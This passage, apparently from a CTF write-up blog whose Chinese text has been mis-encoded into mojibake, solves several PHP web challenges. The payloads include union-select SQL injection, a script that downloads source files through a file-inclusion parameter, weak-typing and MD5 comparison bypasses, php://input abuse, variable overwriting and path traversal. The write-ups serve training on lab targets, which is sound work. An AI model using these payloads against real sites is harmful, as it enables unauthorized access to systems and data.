<p>strcasecmp(str1, str2)ï¼šä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¿”å›0</p>
<p>è§‚å¯Ÿä¸€ä¸‹æ¡ä»¶è¯­å¥ <code>($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))</code></p>
<p>mysql_fetch_array() å‡½æ•°è¿”å›çš„å…³è”æ•°ç»„ä¸­é”®ä¸ºå­—æ®µå</p>
<p>æ„é€ payloadï¼špostä¸€ä¸‹æ•°æ®</p>
<p>user=â€™ union select md(1)#&amp;pass=1</p>
<p><strong>flag: ntcf{union_select_is_wtf}</strong></p>
<h4 id="ç»¼åˆé¢˜2">ç»¼åˆé¢˜2</h4>
<p>è¿™é“é¢˜æ¯”è¾ƒæœ‰ç»¼åˆæ€§ï¼Œæˆ‘ä¹Ÿæ˜¯çœ‹äº†<a href="https://www.wxylyw.com/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/">è¿™ç¯‡WriteUp</a>çš„æç¤ºï¼Œå°±åšä¸€ä¸ªçŸ¥è¯†ç‚¹çš„æ€»ç»“å§ï¼š</p>
<ul>
<li>
<p>ä¸‹è½½æç¤ºæ–‡ä»¶çš„Pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://cms.nuptzj.cn/about.php?file=&quot;</span></span><br><span class="line">file_list = [<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;passencode.php&quot;</span>,<span class="string">&quot;say.php&quot;</span>,<span class="string">&quot;config.php&quot;</span>,<span class="string">&quot;antixss.php&quot;</span>,<span class="string">&quot;about.php&quot;</span>,<span class="string">&quot;so.php&quot;</span>,<span class="string">&quot;antiinject.php&quot;</span>,<span class="string">&quot;xlcteam.php&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(<span class="string">&quot;dowload &quot;</span>+i)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        res.encoding=<span class="string">&quot;utf8&quot;</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(i,<span class="string">&quot;w+&quot;</span>,<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        print(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        text = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>).text</span><br><span class="line">        handle.write(text)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SQLæ³¨å…¥æ—¶éœ€è¦æ­£ç¡®åœ°æ‰¾åˆ°æ³¨å…¥ç‚¹</p>
</li>
<li>
<p>SQLæ³¨å…¥è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ä½¿ç”¨<code>/**/</code>ä»£æ›¿</p>
</li>
<li>
<p>å›è°ƒå‡½æ•°åé—¨</p>
</li>
</ul>
<h4 id="å¯†ç é‡ç½®2">å¯†ç é‡ç½®2</h4>
<h5 id="é¢˜å¹²-v20">é¢˜å¹²</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.ç®¡ç†å‘˜é‚®ç®±è§‚å¯Ÿä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°</span><br><span class="line">2.linuxä¸‹ä¸€èˆ¬ä½¿ç”¨viç¼–è¾‘å™¨ï¼Œå¹¶ä¸”å¼‚å¸¸é€€å‡ºä¼šç•™ä¸‹å¤‡ä»½æ–‡ä»¶</span><br><span class="line">3.å¼±ç±»å‹bypass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v18">é¢˜è§£</h5>
<p>æŸ¥çœ‹æºä»£ç æ–‡ä»¶å¾—åˆ°ç®¡ç†å‘˜é‚®ç®±ï¼š<code>admin@nuptzj.cn</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119170606.png" alt=""></p>
<p>æ ¹æ®æç¤ºï¼Œå­¦åˆ°ä¸€ä¸ªæ–°çŸ¥è¯†æ˜¯<a href="https://www.cnblogs.com/DMDD/p/5052048.html">éæ­£å¸¸å…³é—­viç¼–è¾‘å™¨æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶</a></p>
<p>æŸ¥çœ‹.index.php.swpå’Œ.submit.php.swpæ–‡ä»¶ï¼Œèƒ½æ‰“å¼€.submit.php.swpæ–‡ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	$sql = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;å¤±è´¥äº†å‘€&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¦æ±‚tokené•¿åº¦ä¸º10ä¸”token!=0ä¸ºå‡ï¼Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œç¬¬ä¸€ç§ä¼ å…¥token=0000000000ç»•è¿‡ï¼Œç¬¬äºŒç§åˆ©ç”¨å¼±ç±»å‹ï¼ˆå«æœ‰æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«è½¬æ¢ç±»å‹ï¼‰ä¼ å…¥token=0e12345678ç»•è¿‡ã€‚</p>
<p><strong>flag:nctf{thanks_to_cumt_bxs}</strong></p>
<h4 id="file-get-contents">file_get_contents</h4>
<h5 id="é¢˜å¹²-v21">é¢˜å¹²</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($file) == <span class="string">&quot;meizijiu&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $nctf;</span><br><span class="line">&#125;--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v19">é¢˜è§£</h5>
<p>file_get_contents() å‡½æ•°å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>phpä¼ªåè®®ä¹‹ä¸€ï¼šâ€php://inputâ€å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119194514.png" alt=""></p>
<h4 id="å˜é‡è¦†ç›–-v2">å˜é‡è¦†ç›–</h4>
<h5 id="é¢˜å¹²-v22">é¢˜å¹²</h5>
<p>å˜é‡è¦†ç›–ï¼Œä»£ç å®¡è®¡ç±»é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">&quot;meizijiu233&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v20">é¢˜è§£</h5>
<p>foreach éå†æ•°ç»„æˆ–å¯¹è±¡ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­æŠŠå½“å‰çš„é”®åèµ‹ç»™å˜é‡ $keyï¼Œå€¼èµ‹ç»™å˜é‡$valueã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119194917.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡</title>
    <url>/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡">BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡</h1>
<h2 id="HCTF2018-WarmingUp">[HCTF2018]WarmingUp</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://www.cnblogs.com/h3zh1/p/12853478.html">https://www.cnblogs.com/h3zh1/p/12853478.html</a></p>
</blockquote>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f3a0386f-ebf6-4b35-8a60-87de301e158a.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>æˆ‘æ„Ÿè§‰ä¸Šé¢è¿™ä¸ªåˆ†ææœ‰ç‚¹é—®é¢˜ï¼Œè¿™ä¸ªpayloadåˆ°äº†ç¬¬23è¡Œçš„ifè¯­å¥å°±ç›´æ¥returnï¼Œæ²¡æœ‰åé¢çš„ä»£ç å•¥äº‹äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619203925.png" alt=""></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜2019-PHP">[æå®¢å¤§æŒ‘æˆ˜2019]PHP</h2>
<h3 id="TODO">TODO</h3>
<h2 id="BJDCTF2020-Easy-MD5">BJDCTF2020 Easy MD5</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>PHP MD5</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<h4 id="ç¬¬ä¸€å…³">ç¬¬ä¸€å…³</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620161827.png" alt=""></p>
<p>payloadï¼š<code>ffifdyop</code></p>
<blockquote>
<p>åˆ†ææ–‡ç« ï¼š<a href="https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9">https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure>
<blockquote>
<p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1  ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚</p>
</blockquote>
<h4 id="ç¬¬äºŒå…³">ç¬¬äºŒå…³</h4>
<p>MD5 ç¢°æ’</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620163106.png" alt=""></p>
<h4 id="ç¬¬ä¸‰å…³">ç¬¬ä¸‰å…³</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚</p>
<h3 id="æ‹“å±•">æ‹“å±•</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param1&#x27;</span>]!==(<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">param1&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Ez-bypass">MRCTF2020 Ez_bypass</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>MD5ç»•è¿‡</li>
<li>is_numericç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ã€‚</p>
<p>ç¬¬ä¸€ä¸ªä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚</p>
<p>ç¬¬äºŒä¸ªä¸ºis_numericå‡½æ•°å¼±ç±»å‹ï¼Œç”¨<code>1234567abc</code>ç»•è¿‡ã€‚</p>
<h2 id="BJDCTF2020-Mark-loves-cat">BJDCTF2020 Mark loves cat</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>Gitæºç æ³„éœ²</li>
<li>å˜é‡è¦†ç›–</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p><strong>å…³é”®åœ¨äºè¦è®¤è¯†åˆ°<code>exit()</code>ä¹Ÿæ˜¯å¯ä»¥æ˜¯è¾“å‡ºçš„</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure>
<p>å…ˆæ¥åˆ†æä¸‰ä¸ªifè¯­å¥ï¼š</p>
<ol>
<li>
<p>ç¬¬ä¸€ä¸ªifè¯­å¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é”®åä¸ºflagçš„é”®å€¼ç»å¯¹ç­‰äºå…¶ä¸­æŸä¸€ä¸ªé”®å€¼ï¼Œå¹¶ä¸”é”®åä¸èƒ½æœ‰flagã€‚å‰åç›¸äº’çŸ›ç›¾ï¼Œè¿›ä¸å»è¿™ä¸ªåˆ¤æ–­ã€‚</p>
</li>
<li>
<p>ç¬¬äºŒä¸ªifè¯­å¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸å­˜åœ¨GETå‹çš„flagå‚æ•°ï¼Œä¹Ÿä¸å­˜åœ¨POSTå‹çš„flagå‚æ•°ã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POSTå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagï¼ŒGETå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagã€‚</p>
</li>
</ol>
